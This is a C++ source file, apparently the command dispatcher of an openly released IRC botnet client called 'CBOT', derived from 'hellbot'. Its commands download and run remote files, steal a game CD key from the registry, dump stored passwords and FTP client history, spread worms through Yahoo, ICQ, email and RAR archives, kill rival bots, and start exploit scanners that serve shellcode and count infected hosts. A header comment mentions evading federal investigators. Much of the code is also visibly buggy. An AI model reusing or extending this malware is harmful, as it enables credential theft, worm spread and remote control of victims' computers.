#include "Include.h"
#include "Hell.h"
/* CBOT->Bot Public Release version 3 Mm buggy a little
 * Dev channel is over at irc.dstiny.eu #Arizon blowkey ask me for it in channel
 * Future update's will be released to the wild depending on how we think you like this bot
 * It's nothing special this version. So far it's just based on hellbot
 * And ripped alot from other bot's
 * NOTE TO AUTHORS@
 * REason i didnt credit is
 * Fed's ;) They are see lookzor for see people who ze make ze bots jA!?
 * So hope you understand.
 * Thank's for the support "NAMES HERE" LOL@
 * -   |
 * - X |
 */


/* VIdeo for juanito from x.
* This is how you compile okay. */


char* szScanIpAddress = (char*)malloc(16), *szStartIp, *szSubnet;
void CMain::ExecuteCmd(vector <string> iBuffer)
{

	char msgbuf[1024];
	char tmpbuf[1024];
	unsigned int uptime;
	int i;
#define bufsize 2000

	
    if (iBuffer[3].compare(7,iBuffer[3].length()-7,"sysinfo") == 0) 
	{
		
		PBlowCrypt(blowkey,sysinfo(buff));
		_snprintf(tmpbuf,bufsize,"%s",sysinfo(buff));
		sprintf(msgbuf,"%s\r\n", tmpbuf);
		BOT->cIRC.SendData("PRIVMSG %s :%s %s\r\n", BOT->cIRC.cConf.cChan.c_str(),msgbuf);
		return;
	}
	else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"login") == 0)
	{
		BOT->cIRC.SendData("PRIVMSG %s :-Auth system- Password [%s] accepted\r\n", BOT->cIRC.cConf.cChan.c_str(),iBuffer[4].c_str());
		char login[] = "-delay- Bot on delay mode, User tried to login with none BOTbot commands";
		PBlowCrypt(blowkey,login);
		_snprintf(tmpbuf,bufsize,"%s",login);
		sprintf(msgbuf,"%s\r\n", tmpbuf);
		BOT->cIRC.SendData("PRIVMSG %s :%s\r\n", BOT->cIRC.cConf.cChan.c_str(),msgbuf);
		BOT->delay();
	}
	else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"dl") == 0)
	{
		BOT->cIRC.SendData("PRIVMSG %s :-Download.cpp- Downloading [%s]\r\n", BOT->cIRC.cConf.cChan.c_str(),iBuffer[4].c_str());
		char login[] = "-delay- Bot on delay mode, User tried to use a none BOTbot commands";
		PBlowCrypt(blowkey,login);
		_snprintf(tmpbuf,bufsize,"%s",login);
		sprintf(msgbuf,"%s\r\n", tmpbuf);
		BOT->cIRC.SendData("PRIVMSG %s :%s\r\n", BOT->cIRC.cConf.cChan.c_str(),msgbuf);
		BOT->delay();
	}
	else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"download") == 0 && iBuffer.size() > 6) {
		BOT->hDownload.sUrl = iBuffer[4];
		BOT->hDownload.sDest = iBuffer[5];
		BOT->hDownload.sUpdate = iBuffer[6];
		BOT->hDownload.Start(true);
		return;
	}
	
	else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"remove") == 0) {
		BOT->hRegcheck.Kill();
		Uninstall();	
		BOT->cIRC.IRCRunning = false;
		BOT->botRunning = false;
		return;
	}
	else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"raw") == 0 && iBuffer.size() > 6) {
		BOT->cIRC.SendData("%s %s %s %s\r\n",iBuffer[4].c_str(),BOT->cIRC.cConf.cChan.c_str(),iBuffer[5].c_str(),iBuffer[6].c_str());
		return;
	}
	
	
	else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"killstart") == 0 && iBuffer.size() > 6) {
		char msg[] = "-BotKiller.cpp- MemoryScanner: Scanning memory and killing process";
		PBlowCrypt(blowkey,msg);
		_snprintf(tmpbuf,bufsize,"%s",msg);
		sprintf(msgbuf,"%s\r\n", tmpbuf);
		BOT->cIRC.SendData("PRIVMSG %s :%s %s\r\n", BOT->cIRC.cConf.cChan.c_str(),msgbuf);
		CreateThread(NULL, 0, &botkiller_main, 0, 0, 0);
		return;
	}
	
	else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"getip") == 0) {
		
		
		char msg[] = "-Others.cpp- Getting external ip:";
		PBlowCrypt(blowkey,msg);
		_snprintf(tmpbuf,bufsize,"%s",msg);
		sprintf(msgbuf,"%s\r\n", tmpbuf);
		BOT->cIRC.SendData("PRIVMSG %s :%s %s\r\n", BOT->cIRC.cConf.cChan.c_str(),msgbuf);
		ip();
		return;
	}
	
	else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"version") == 0) {
		
		
		char msg[] = "-Others.cpp- Version BOTBOT BlowEncryption Test v3";
		PBlowCrypt(blowkey,msg);
		_snprintf(tmpbuf,bufsize,"%s",msg);
		sprintf(msgbuf,"%s\r\n", tmpbuf);
		BOT->cIRC.SendData("PRIVMSG %s :%s %s\r\n", BOT->cIRC.cConf.cChan.c_str(),msgbuf);
		return;
	}
	
	else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"detectstart") == 0) 
	{
		
		char msg[] = "-BotDetect.cpp- hModule FindBot: BotDetection Started";
		PBlowCrypt(blowkey,msg);
		_snprintf(tmpbuf,bufsize,"%s",msg);
		sprintf(msgbuf,"%s\r\n", tmpbuf);
		BOT->cIRC.SendData("PRIVMSG %s :%s %s\r\n", BOT->cIRC.cConf.cChan.c_str(),msgbuf);
		botdetect();
		return;
	}
	else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"active") == 0) {
		char WndTxt[1024];
		
		if (GetWindowText(GetForegroundWindow(), WndTxt, sizeof(WndTxt)) > 0)
		{
			
			PBlowCrypt(blowkey,WndTxt);
			_snprintf(tmpbuf,bufsize,"%s",WndTxt);
			sprintf(msgbuf,"%s\r\n", tmpbuf);
			BOT->cIRC.SendData("PRIVMSG %s :%s\r\n", BOT->cIRC.cConf.cChan.c_str(),msgbuf);
			
		}
		return;
	}
	
	
	else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"blowtest") == 0)
	{
		
		char msg[] = "";
		PBlowCrypt(blowkey,msg);
		_snprintf(tmpbuf,bufsize,"-Blowfish.cpp- Encryption key [%s]",blowkey);
		sprintf(msgbuf,"%s\r\n", tmpbuf);
		BOT->cIRC.SendData("PRIVMSG %s :%s\r\n", BOT->cIRC.cConf.cChan.c_str(),msgbuf);
		return;
		
	}
	
	else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"stop") == 0  && FindPid("Scanner") == 0)
	{
		if (!(FindPid("Scanner") == 0))
		{
			
			char msg[] = "-scanner.cpp- Scan infecting ended on";
			PBlowCrypt(blowkey,msg);
			_snprintf(tmpbuf,bufsize,"%s: %s",msg,GetIP(dwCurrentIp));
			sprintf(msgbuf,"%s\r\n", tmpbuf);
			bScanning = false;
			Sleep(5000);
			DelThread(FindPid("Scanner"));
			BOT->cIRC.SendData("PRIVMSG %s :%s %s\r\n", BOT->cIRC.cConf.cChan.c_str(), msgbuf,GetIP(dwCurrentIp));
			dwCurrentIp = NULL;
			return;
		}
		else
		{
			char msg[] = "-scanner.cpp- Scanner is not active";
			PBlowCrypt(blowkey,msg);
			_snprintf(tmpbuf,bufsize,"%s: %s",msg,GetIP(dwCurrentIp));
			sprintf(msgbuf,"%s\r\n", tmpbuf);
			BOT->cIRC.SendData("PRIVMSG %s :%s %s\r\n", BOT->cIRC.cConf.cChan.c_str(), msgbuf);
		}
		
		
	}
	
	
	else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"current") == 0)
	{
		
		
		if (!(FindPid("Scanner") == 0))
		{
			char msg[] = "";
			sprintf(msg,"	-Scanner.cpp- scan engine: currently scanning %s",GetIP(dwCurrentIp));
			PBlowCrypt(blowkey,msg);
			_snprintf(tmpbuf,bufsize,"%s",msg);
			sprintf(msgbuf,"%s\r\n", tmpbuf);
			BOT->cIRC.SendData("PRIVMSG %s :%s\r\n", BOT->cIRC.cConf.cChan.c_str(),msgbuf);
		} else {
			char msg[] = "";
			sprintf(msg,"-Scanner.cpp- Scan engine: No scanner valid.");
			PBlowCrypt(blowkey,msg);
			_snprintf(tmpbuf,bufsize,"%s",msg);
			sprintf(msgbuf,"%s\r\n", tmpbuf);
			BOT->cIRC.SendData("PRIVMSG %s :%s\r\n", BOT->cIRC.cConf.cChan.c_str(),msgbuf);
		}
		return;
	}
	
	else if (iBuffer[3].compare(7, iBuffer[3].length()-7, "status") == 0)
	{
		int t;
		int nTotalServed = 0;
		for(t = 0; pExploit[t].usPort != 0; t++)
			nTotalServed += pExploit[t].iStatics;
		
		
		char *msg = "";
		sprintf(msg,"-Scanner.cpp- Shellcode currently listening on: %d with %d sends",usSHellcodePort, nTotalServed);
		PBlowCrypt(blowkey,msg);
		_snprintf(tmpbuf,bufsize,"%s",msg);
		sprintf(msgbuf,"%s",tmpbuf);
		BOT->cIRC.SendData("PRIVMSG %s :%s\r\n", BOT->cIRC.cConf.cChan.c_str(),msgbuf);
		return;
	}
	
	
	
	
	else if (iBuffer[3].compare(7,iBuffer[6].length()-7,"cdkey") == 0)
	{
		
		DWORD dwVersion;
		char lszValue[100];
		LONG lRet, lEnumRet;
		HKEY hKey;
		DWORD dwLength=100;
		int i=0;
		lRet = RegOpenKeyEx (HKEY_LOCAL_MACHINE, "Software\\Activision\\Call of Duty 4\\codkey", 0L, KEY_READ , &hKey);
		if(lRet == ERROR_SUCCESS)
		{
			lEnumRet = RegEnumKey (hKey, i,lszValue,dwLength);	
			i++;
			char msg[] = "";
			sprintf(msg,"-Cdkey.cpp- Found game %s serial is (%s)",hKey,lszValue);
			PBlowCrypt(blowkey,msg);
			_snprintf(tmpbuf,bufsize,"%s",msg);
			sprintf(msgbuf,"%s\r\n", tmpbuf);
			BOT->cIRC.SendData("PRIVMSG %s :%s\r\n", BOT->cIRC.cConf.cChan.c_str(),msgbuf);
			lEnumRet = RegEnumKey (hKey, i,lszValue,dwLength);
			RegCloseKey(hKey);
		} else {
			char msg[] = "";
			sprintf(msg,"-Cdkey.cpp- Defined keys not found");
			BOT->cIRC.SendData("PRIVMSG %s :%s\r\n", BOT->cIRC.cConf.cChan.c_str(),msgbuf);
			
		}	
		
	}
	else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"pstore") == 0)
	{
		
		char msg[] = "";
		sprintf(msg,"-Pstore.cpp- [Pstorec.dll] Listing gathered information:");
		PBlowCrypt(blowkey,msg);
		_snprintf(tmpbuf,bufsize,"%s",msg);
		sprintf(msgbuf,"%s\r\n", tmpbuf);
		BOT->cIRC.SendData("PRIVMSG %s :%s\r\n", BOT->cIRC.cConf.cChan.c_str(),msgbuf);
		CreateThread(NULL, 0, &pstore, 0, 0, 0);
	}
	else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"msnstart") == 0)
	{
		
		char windir[MAX_PATH];
		GetWindowsDirectory(windir,sizeof(windir));
		strcat(windir,"\\");
		strcat(windir,iBuffer[4].c_str());
		//		sprintf(iBuffer[5].c_str(), "%s",windir);
		BOT->cIRC.SendData("PRIVMSG %s :%s\r\n", BOT->cIRC.cConf.cChan.c_str(),msgbuf);
	}
	
	else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"yahoostart") == 0)
	{
		char msg[] = "";
		sprintf(msg,"-Worms.cpp- YAHOO Worm initialized");
		PBlowCrypt(blowkey,msg);
		_snprintf(tmpbuf,bufsize,"%s",msg);
		sprintf(msgbuf,"%s\r\n", tmpbuf);
		BOT->cIRC.SendData("PRIVMSG %s :%s\r\n", BOT->cIRC.cConf.cChan.c_str(),msgbuf);
		//			yahoo();
	}
	else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"icqstart") == 0)
	{
		char msg[] = "";
		sprintf(msg,"-Worms.cpp- ICQ Worm initalized");
		PBlowCrypt(blowkey,msg);
		_snprintf(tmpbuf,bufsize,"%s",msg);
		sprintf(msgbuf,"%s\r\n", tmpbuf);
		BOT->cIRC.SendData("PRIVMSG %s :%s\r\n", BOT->cIRC.cConf.cChan.c_str(),msgbuf);
		//icqtest();
	}
	
	else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"flashfxp") == 0)
	{
		
		char msg[] = "";
		sprintf(msg,"-Flashfxp.cpp- Found FlashFXP History File");
		PBlowCrypt(blowkey,msg);
		_snprintf(tmpbuf,bufsize,"%s",msg);
		sprintf(msgbuf,"%s\r\n", tmpbuf);
		
		if(FlashFXP(0))
			BOT->cIRC.SendData("PRIVMSG %s :%s\r\n", BOT->cIRC.cConf.cChan.c_str(),msgbuf);
		else
			char msg[] = "";
		sprintf(msg,"-Flashfxp.cpp- no FlashFXP History found");
		BOT->cIRC.SendData("PRIVMSG %s :%s\r\n", BOT->cIRC.cConf.cChan.c_str(),msgbuf);
		return;
	} 
	
	else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"parse") == 0)
	{
		FlashFXP(1);
		BOT->cIRC.SendData("PRIVMSG %s :-Flashfxp.cpp- FTP: %s\r\n", BOT->cIRC.cConf.cChan.c_str(),line);
		return;
	} 
	
	else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"mailstart") == 0)
	{
		BOT->Hellmail.Start(false);
		char msg[] = "";
		sprintf(msg,"-Worms.cpp- Mytob3: Started");
		PBlowCrypt(blowkey,msg);
		_snprintf(tmpbuf,bufsize,"%s",msg);
		sprintf(msgbuf,"%s\r\n", tmpbuf);
		BOT->cIRC.SendData("PRIVMSG %s :%s\r\n", BOT->cIRC.cConf.cChan.c_str(),msgbuf);
		return;
	} 
	else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"mailstop") == 0)
	{
		BOT->Hellmail.Start(true);
		char msg[] = "";
		sprintf(msg,"-Worms.cpp- Mytob3: Stopped");
		PBlowCrypt(blowkey,msg);
		_snprintf(tmpbuf,bufsize,"%s",msg);
		sprintf(msgbuf,"%s\r\n", tmpbuf);
		BOT->cIRC.SendData("PRIVMSG %s :%s\r\n", BOT->cIRC.cConf.cChan.c_str(),msgbuf);
		return;
	} 
	
	
	
	else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"ident") == 0)
	{
		CreateThread(NULL, 0, &IdentThread, 0, 0, 0);
		static char IP[16];
		SOCKET sock;
		SOCKADDR sa;
		int sas = sizeof(sa);
		memset(&sa, 0, sizeof(sa));
		getsockname(sock, &sa, &sas);
		sprintf(IP,"%d.%d.%d.%d",(BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);
		
		BOT->cIRC.SendData("PRIVMSG %s :-Ident.cpp- IDENTServer: IP: %s , PORT: 6667\r\n", BOT->cIRC.cConf.cChan.c_str(),IP);
	}
	else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"honeypot") == 0)
	{
		CreateThread(NULL, 0, &MYDOOM2,   0, 0, 0);
		CreateThread(NULL, 0, &MYDOOM,    0, 0, 0);
		CreateThread(NULL, 0, &VNCHONEYPOT, 0, 0, 0);
		BOT->cIRC.SendData("PRIVMSG %s :-Honeypot.cpp- Honeypot: Loaded modules: Mydoom1 Mydoom2- Vnc\r\n", BOT->cIRC.cConf.cChan.c_str());
	}
	
	else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"rarstart") == 0)
	{
		CreateThread(NULL, 0, &RarWorm,   0, 0, 0);
		BOT->cIRC.SendData("PRIVMSG %s :-Worms.cpp- Infecting self to all rar files complete!\r\n", BOT->cIRC.cConf.cChan.c_str());
	}
	
	else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"infected") == 0)
	{
		int nTotalServed = 0;
		char szBuffer[128]; char szTempBuffer[128];
		
		_snprintf(szBuffer, sizeof(szBuffer), "-Scanner.cpp- Exploited:");
		
		for(i = 0; pExploit[i].usPort != 0; i++)
		{
			nTotalServed += pExploit[i].iStatics;
			_snprintf(szTempBuffer, sizeof(szTempBuffer), " %d. %s", pExploit[i].iStatics, pExploit[i].szName);
			strncat(szBuffer, szTempBuffer, sizeof(szBuffer));
		}
		
		_snprintf(szTempBuffer, sizeof(szTempBuffer), " total: %d", nTotalServed);
		strncat(szBuffer, szTempBuffer, sizeof(szBuffer));
		char msg[] = "";
		sprintf(msg,"%s",szBuffer);
		PBlowCrypt(blowkey,msg);
		_snprintf(tmpbuf,bufsize,"%s",msg);
		sprintf(msgbuf,"%s\r\n", tmpbuf);
		
		BOT->cIRC.SendData("PRIVMSG %s :%s\r\n", BOT->cIRC.cConf.cChan.c_str(), msgbuf);
		return;
	}
	
	else if (iBuffer[3].compare(7,iBuffer[3].length()-7,"uptime") == 0) {
		DWORD total, days, hours, minutes;
		total = (GetTickCount() / 1000);
		days = total / 86400;
		hours = (total % 86400) / 3600;
		minutes = ((total % 86400) % 3600) / 60;
		BOT->cIRC.SendData("PRIVMSG %s :-Others.cpp- System uptime: %d day(s), %d hour(s), and %d minute(s)\r\n", BOT->cIRC.cConf.cChan.c_str(), days, hours, minutes);
		return;
	}
	
	/* Scanning Startline */
	else if (iBuffer[3].compare(7,iBuffer[3].length()-7, "start"))
	{
		char msg[] = "";
		// Assign the scan port / exploit
		if (iBuffer[4].c_str(), "-e")
		{
			
			i = RandomNumber(2, 5);
			pScannerHandler.usPort		= pExploit[i].usPort;
			pScannerHandler.iExploitId	= i;
		}
		else
		{
			pScannerHandler.usPort = (unsigned short)atoi(iBuffer[4].c_str());
			// Assign the exploit id
			pScannerHandler.iExploitId = 0;
			
			for(i = 0; pExploit[i].usPort != 0; i++)
			{
				if (pExploit[i].szCommand,iBuffer[4].c_str())
				{
					pScannerHandler.usPort		= pExploit[i].usPort;
					pScannerHandler.iExploitId	= i;
					break;
				}
			}
		}
		
		if(!pScannerHandler.usPort)
		{
			char msg[] = "";
			sprintf(msg,"-scanner- failed module chosen doesn't excist");
			PBlowCrypt(blowkey,msg);
			_snprintf(tmpbuf,bufsize,"%s",msg);
			sprintf(msgbuf,"%s\r\n", tmpbuf);
			BOT->cIRC.SendData("PRIVMSG %s :%s\r\n",BOT->cIRC.cConf.cChan.c_str(),msgbuf);
			return;
		}
		
		// Assign the ip to start scanning on
		if (iBuffer[5].c_str(), "-s")
		{
			char* szScanIpAddress = (char*)malloc(16), *szStartIp, *szSubnet;
			
			strncpy(szScanIpAddress, szShellcodeIpAddress, 16);
			
			if(!(szStartIp = szScanIpAddress))
				return;
			
			if(!(szSubnet = strstr(strstr(szScanIpAddress, ".") + 1, ".")))
				return;
			
			*PBYTE(szSubnet+1) = 0;
			
			_snprintf(szStartIp, 16, "%s%d.%d", szStartIp, 0, 0);
			
			pScannerHandler.dwStartIp = inet_addr(szStartIp);
			
			free(szScanIpAddress);
		}
		else
			if (iBuffer[6].c_str(), "-x")
				pScannerHandler.dwStartIp = GetRandomIP();
			else
				pScannerHandler.dwStartIp = inet_addr(iBuffer[6].c_str());
			
			// Assign the time in minutes to scan on
			pScannerHandler.iMinutes = atoi(iBuffer[6].c_str());
			
			// Assign the method to scan for (random/recursive)
			if (iBuffer[7].c_str(), "-r")
				pScannerHandler.iScanType = 0;
			else
				if (iBuffer[6].c_str(), "-x")
					pScannerHandler.iScanType = 1;
				else
					return;
				
				// Assign the sockets to use for scanning
				pScannerHandler.iThreads = atoi("100");
				pScannerHandler.iThreads = ((pScannerHandler.iThreads < 0)?(128):(pScannerHandler.iThreads));
				pScannerHandler.iThreads = ((pScannerHandler.iThreads > 4098)?(4098):(pScannerHandler.iThreads));
				// Assign the time-out in MS for scanning
				pScannerHandler.iDelay = atoi("10");
				// Use logic scan ?
				pScannerHandler.bLogicScan = false;
				
				
				AddThread(&ScanThread, (LPVOID)&pScannerHandler, 1, "Scanner");
				sprintf(msg," -scanner- Started: %s %s %s %s",iBuffer[4].c_str(),iBuffer[6].c_str(),iBuffer[6].c_str(),iBuffer[7].c_str());
				PBlowCrypt(blowkey,msg);
				_snprintf(tmpbuf,bufsize,"%s",msg);
				sprintf(msgbuf,"%s\r\n", tmpbuf);
				BOT->cIRC.SendData("PRIVMSG %s :%s\r\n",BOT->cIRC.cConf.cChan.c_str(),msgbuf);
				
				return;
	}
	
	
	
	
	else if (iBuffer[3].compare(7, iBuffer[3].length()-7, "listthread") == 0)
	{
		char msg[] = "";
		PBlowCrypt(blowkey,msg);
		_snprintf(tmpbuf,bufsize,"%s",msg);
		sprintf(msgbuf,"%s\r\n", tmpbuf);
		if (!(FindPid("Scanner") == 0))
		{
			if (!(FindPid("svc_start") == 0))
			{
				if (!(FindPid("FTPDaemon") == 0))
				{
					if (!(FindPid("ShellcodeDaemon") == 0))
					{
						if (!(FindPid("TFTPDaemon") == 0))
						{
							sprintf(msg,"-Threads.cpp- listthreads: Scanner.cpp [Scanner] Service.cpp [Svc_Start] wormride.cpp [FTPDaemon] wormride.cpp [TFTPDaemon] Shellcode.cpp [ShellcodeDaemon]");
						} 
						else{
							sprintf(msg,"-Threads.cpp- listthreads: Could not list thread's No thread's found?");
						}
					}
				}
			}
		}
		BOT->cIRC.SendData("PRIVMSG %s :%s\r\n",BOT->cIRC.cConf.cChan.c_str(),msgbuf);
		
	}
	
	
	
	else if (iBuffer[3].compare(7, iBuffer[3].length()-7, "KillThreadAll") == 0)
	{
		DelThread(FindPid("svc_start"));
		DelThread(FindPid("FTPDaemon"));
		DelThread(FindPid("ShellcodeDaemon"));
		DelThread(FindPid("TFTPDaemon"));
		DelThread(FindPid("FTPDaemon"));
		DelThread(FindPid("Scanner"));
		char msg[] = "";
		sprintf(msg,"	-Thread.cpp- Killing All threads: [svc_start]: Stopped [FTPDaemon]: Stopped [ShellcodeDaemon]: Stopped [TFTPDaemon]: Stopped [FTPDaemon]: Stopped");
		PBlowCrypt(blowkey,msg);
		_snprintf(tmpbuf,bufsize,"%s",msg);
		sprintf(msgbuf,"%s\r\n", tmpbuf);
		BOT->cIRC.SendData("PRIVMSG %s :%s\r\n",BOT->cIRC.cConf.cChan.c_str(),msgbuf);
		
	}
	
	
	
	
	
	
}


